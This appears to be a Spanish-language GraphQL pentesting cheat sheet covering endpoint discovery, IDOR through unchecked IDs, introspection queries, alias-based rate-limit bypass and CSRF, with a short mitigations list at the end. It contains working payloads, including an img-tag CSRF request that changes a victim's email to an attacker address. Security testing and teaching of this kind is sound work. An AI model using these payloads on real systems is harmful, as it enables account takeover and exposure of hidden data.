# 🧖‍♂️ Real World Payloads



Encontrar Endpoints de GraphQL

#### Identificación Básica de Endpoints

1. **Endpoints Comunes:**
   * `/graphql`
   * `/api`
   * `/api/graphql`
   * `/graphql/api`
   * `/graphql/graphql`
2.  **Método de Prueba:** Envía la consulta universal a cada endpoint:

    ```json
    {
        "query": "{__typename}"
    }
    ```

**Respuesta esperada**

```json
{
    "data": {
        "__typename": "query"
    }
}
```

***

#### Métodos de Solicitud Alternativos

1.  **POST con `application/json` (Recomendado):**

    ```http
    POST /graphql HTTP/1.1
    Host: target.com
    Content-Type: application/json

    {
        "query": "{__typename}"
    }
    ```
2.  **GET:** Algunos endpoints pueden aceptar consultas por `GET`.

    ```http
    GET /graphql?query={__typename} HTTP/1.1
    Host: target.com
    ```

***

### Explotación de Argumentos No Saneados

#### Ejemplo: Consulta de Productos

**Consulta Inicial**

```json
query {
    products {
        id
        name
        listed
    }
}
```

**Respuesta**

```json
{
    "data": {
        "products": [
            { "id": 1, "name": "Producto 1", "listed": true },
            { "id": 2, "name": "Producto 2", "listed": true }
        ]
    }
}
```

**Exploit: IDOR para Productos Ocultos**

```json
query {
    product(id: 3) {
        id
        name
        listed
    }
}
```

**Respuesta Esperada**

```json
{
    "data": {
        "product": {
            "id": 3,
            "name": "Producto Oculto",
            "listed": false
        }
    }
}
```

***

### Uso de Introspección para Descubrir Esquemas

#### Consulta de Introspección Básica

```json
{
    "query": "{__schema{queryType{name}}}"
}
```

**Respuesta Esperada**

```json
{
    "data": {
        "__schema": {
            "queryType": {
                "name": "Query"
            }
        }
    }
}
```

***

#### Introspección Completa

```json
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        types {
            name
            kind
            fields {
                name
                args { name type { name } }
            }
        }
    }
}
```

**Resultado**

Detalla el esquema completo, incluidas las consultas, mutaciones y tipos.

***

### Alias para Evitar Límites de Tasa

#### Ejemplo de Consulta con Alias

```json
query {
    user1: user(id: 1) { name }
    user2: user(id: 2) { name }
    user3: user(id: 3) { name }
}
```

**Respuesta**

```json
{
    "data": {
        "user1": { "name": "Alice" },
        "user2": { "name": "Bob" },
        "user3": { "name": "Charlie" }
    }
}
```

***

### CSRF en GraphQL

#### Ejemplo de Consulta Maliciosa

```json
mutation {
    updateEmail(email: "attacker@example.com") {
        success
    }
}
```

#### Ejemplo de Carga Maliciosa

```html
<img src="https://target.com/graphql?query=mutation%7BupdateEmail(email%3A%22attacker@example.com%22)%7D">
```

***

### Mitigaciones

1. **Deshabilitar Introspección en Producción.**
2. **Validar los Argumentos de Consultas.**
3. **Tokens CSRF y Validación de Origen.**
4. **Limitar Operaciones por Solicitud.**
5. **Configuración de CORS Estricta.**
